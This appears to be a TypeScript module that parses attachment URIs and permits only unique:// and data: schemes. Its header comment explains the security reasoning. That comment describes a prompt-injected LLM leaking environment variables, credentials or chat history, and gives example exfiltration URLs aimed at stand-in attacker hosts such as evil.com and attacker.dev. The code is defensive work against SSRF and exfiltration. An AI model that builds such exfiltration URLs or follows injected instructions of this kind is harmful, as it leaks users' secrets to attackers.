// Arbitrary external URLs are intentionally not supported.
// Fetching user-supplied URLs server-side would expose the service to SSRF attacks:
// an attacker (or a prompt-injected LLM) could target internal infrastructure
// (metadata servers, cluster-internal services, etc.) by supplying a crafted URL.
//
// Data exfiltration via attachments is another risk: a prompt-injected LLM could
// encode sensitive data (environment variables, database credentials, internal API
// responses, chat history) into the attachment URI itself — for example:
//   - `https://evil.com/collect?secret=<base64-encoded-env-vars>`
//   - `https://attacker.dev/exfil/<jwt-token-from-memory>`
//   - A `data:` URI converted to a file and sent as an email attachment containing
//     scraped internal data
// By restricting to `unique://` and `data:` schemes, outbound fetches to attacker-
// controlled servers are prevented, closing this exfiltration channel.
//
// Use `unique://` for Unique knowledge-base files or `data:` for inline content instead.
export type ParsedUri =
  | { type: 'unique'; contentId: string }
  | { type: 'data'; mimeType: string; data: Buffer };

const UNIQUE_URI_PATTERN = /^unique:\/\/content\/([^/]+)$/;
const DATA_URI_PATTERN = /^data:([^;,]*)(;base64)?,(.*)$/s;

export function parseAttachmentUri(uri: string): ParsedUri {
  const uniqueMatch = uri.match(UNIQUE_URI_PATTERN);
  if (uniqueMatch) {
    const contentId = uniqueMatch[1];
    return { type: 'unique', contentId: contentId ?? '' };
  }

  const dataMatch = uri.match(DATA_URI_PATTERN);
  const rawData = dataMatch?.[3];
  if (dataMatch && rawData) {
    const mimeType = dataMatch[1] || 'application/octet-stream';
    const isBase64 = dataMatch[2] === ';base64';
    const data = isBase64
      ? Buffer.from(rawData, 'base64')
      : Buffer.from(decodeURIComponent(rawData));

    return { type: 'data', mimeType, data };
  }

  throw new Error(`Unsupported attachment URI scheme: ${uri.slice(0, 30)}`);
}
